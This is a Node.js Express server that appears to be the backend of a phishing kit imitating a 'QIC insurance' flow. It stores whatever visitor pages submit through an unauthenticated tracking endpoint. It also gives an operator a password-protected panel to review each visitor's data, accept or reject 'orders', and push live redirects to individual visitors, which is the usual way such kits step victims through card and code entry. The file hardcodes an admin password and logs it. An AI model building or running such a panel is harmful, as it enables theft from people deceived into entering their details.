const express = require('express');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const PUBLIC_DIR = path.join(__dirname, 'public');

// Change this to your own password (or set the ADMIN_PASSWORD env var before starting the server)
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Ha098765@@';

app.use(express.json());
app.use(express.static(PUBLIC_DIR));

// ---- In-memory visit store ----
const visits = {};
const ACTIVE_WINDOW_MS = 5 * 60 * 1000; // considered "active" if updated in last 5 minutes

// ---- In-memory admin session tokens ----
const adminTokens = new Set();

// ---- In-memory orders store ----
const orders = [];

function requireAdmin(req, res, next) {
  const token = req.headers['x-admin-token'];
  if (token && adminTokens.has(token)) return next();
  return res.status(401).json({ error: 'unauthorized' });
}

function requireAdminPassword(req, res, next) {
  const password = req.headers['x-admin-password'];
  if (password === ADMIN_PASSWORD) return next();
  return res.status(401).json({ error: 'unauthorized' });
}

// ---- Admin auth ----
app.post('/api/admin-login', (req, res) => {
  const { password } = req.body || {};
  if (password === ADMIN_PASSWORD) {
    const token = crypto.randomBytes(24).toString('hex');
    adminTokens.add(token);
    return res.json({ ok: true, token });
  }
  res.status(401).json({ error: 'wrong password' });
});

app.post('/api/admin-logout', (req, res) => {
  const token = req.headers['x-admin-token'];
  if (token) adminTokens.delete(token);
  res.json({ ok: true });
});

// ---- Admin API: check password ----
app.get('/api/admin/check', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password === ADMIN_PASSWORD) {
    return res.json({ ok: true });
  }
  res.status(401).json({ error: 'unauthorized' });
});

// ---- Admin API: get orders ----
app.get('/api/admin/orders', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  // تحويل visits إلى orders format
  const ordersList = Object.values(visits).map(v => ({
    ref: v.visitId,
    ts: v.createdAt || Date.now(),
    status: v.status || 'active',
    ...v // دمج جميع البيانات الأخرى
  }));

  const active = ordersList.filter(o => o.status === 'active').length;
  res.json({
    orders: ordersList,
    active: active
  });
});

// ---- Admin API: make decision on order ----
app.post('/api/admin/decide/:ref', (req, res) => {
  const password = req.headers['x-admin-password'];
  if (password !== ADMIN_PASSWORD) {
    return res.status(401).json({ error: 'unauthorized' });
  }

  const { ref } = req.params;
  const { action } = req.body || {};

  const visit = visits[ref];
  if (!visit) {
    return res.status(404).json({ error: 'order not found' });
  }

  if (action === 'accept') {
    visit.status = 'accepted';
  } else if (action === 'reject') {
    visit.status = 'rejected';
  }

  res.json({ ok: true, visit });
});

// ---- Public: visitor tracking (no auth - used by the flow pages themselves) ----
app.post('/api/track', (req, res) => {
  const data = req.body || {};
  const visitId = data.visitId;
  if (!visitId) return res.status(400).json({ error: 'visitId required' });

  const now = Date.now();
  const existing = visits[visitId] || { visitId, createdAt: now };
  const pendingRedirect = existing.pendingRedirect || null;

  visits[visitId] = {
    ...existing,
    ...data,
    visitId,
    updatedAt: now,
    status: 'active',
    pendingRedirect: null,
  };

  res.json({ ok: true, redirect: pendingRedirect || undefined });
});

// ---- Admin-only: view & control visits ----
app.get('/api/visits', requireAdmin, (req, res) => {
  const now = Date.now();
  const list = Object.values(visits)
    .map(v => ({ ...v, status: (now - v.updatedAt) <= ACTIVE_WINDOW_MS ? 'active' : 'inactive' }))
    .sort((a, b) => b.updatedAt - a.updatedAt);
  res.json(list);
});

app.post('/api/redirect', requireAdmin, (req, res) => {
  const { visitId, target } = req.body || {};
  if (!visitId || !target) return res.status(400).json({ error: 'visitId and target required' });
  if (!visits[visitId]) return res.status(404).json({ error: 'visit not found' });
  visits[visitId].pendingRedirect = target;
  res.json({ ok: true });
});

app.get('/', (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`QIC insurance flow running at http://localhost:${PORT}`);
  console.log(`Admin dashboard at http://localhost:${PORT}/admin.html (password: ${ADMIN_PASSWORD})`);
});
